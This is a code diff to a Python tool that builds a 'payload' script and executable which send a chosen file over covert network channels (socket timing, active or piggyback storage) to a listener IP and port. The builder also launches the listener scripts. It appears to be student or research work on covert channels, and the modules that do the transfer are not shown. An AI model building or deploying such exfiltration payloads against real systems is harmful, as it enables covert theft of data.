@@ -6,11 +6,12 @@ import socket
 import ListenerActiveStorage
 import ListenerSocketTiming
 import subprocess
+#import PassiveServer
 
 
-filepath = ""
-port = 12003
-ip_addr = socket.gethostbyname(socket.gethostname())
+filepath = "Hi.txt"
+port = 13001
+ip_addr = socket.gethostbyname(socket.gethostname())  ##gets the ip address of the host
 
 
 #########Front End of the Porgram (Console)
@@ -21,11 +22,7 @@ def console():
 
     global filepath
     global port
-    
-    ##gets the ip address of the host
     global ip_addr
-
-
 
     while(True):
         commands = input(">>").split()
@@ -120,11 +117,40 @@ def console():
 def payload(fp, name, Ip, port):
     with open(str(name) + ".py", "w") as f:
         f.write("""
-import DGCC
+from peterFitness import fitnessFunction
+from TargetSocketTiming import socketTiming
+from TargetActiveStorage  import activeStorage
 
-filepath = """ +  " r'"  +str(fp) +  "' " + """
-Targetip = """ +  " '" + str(Ip) + "' " +"""
+ip_addr = '""" + str(Ip) + """'
 port = """ + str(port) + """
+filepath = '""" + str(fp) + """'
+
+
+
+if __name__ == "__main__":
+    pingThreshhold=64
+    sizeThreshhold=2048
+    trafficThreshold=1024
+
+    print("gathering network statistics...")
+    isPingHigh, isSizeHigh, isTrafficHigh = fitnessFunction(ip_addr, filepath, pingThreshhold, sizeThreshhold, trafficThreshold)
+    print("gathered\\n")
+    isSizeHigh = False
+    isPingHigh = False
+    isTrafficHigh = False
+
+    if (not isSizeHigh and not isPingHigh):
+        print("socket")
+        socketTiming(port, filepath)
+
+    elif (isTrafficHigh):
+        print("piggback storage")
+        piggybackStorage(ip_addr, port, filepath)
+
+    else:
+        print("active storage")
+        print("ip_addr")
+        activeStorage(ip_addr, port, filepath)
 
 """)
 
@@ -145,11 +171,12 @@ def makeexe(name, icon):
 
 def liseners(ip, port):
     subprocess.Popen('python ListenerSocketTiming.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
-    subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage
+    subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #ActiveStorage
+    #subprocess.Popen('python PassiveServer.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage 
 
 
 if __name__ == '__main__':
     (filepath, name, Ip, port, icon) = console()
-    payload(filepath, name, Ip, port)
-    makeexe(name, icon)
+    #payload(filepath, name, Ip, port)
+    #makeexe(name, icon)
     liseners(Ip, port)
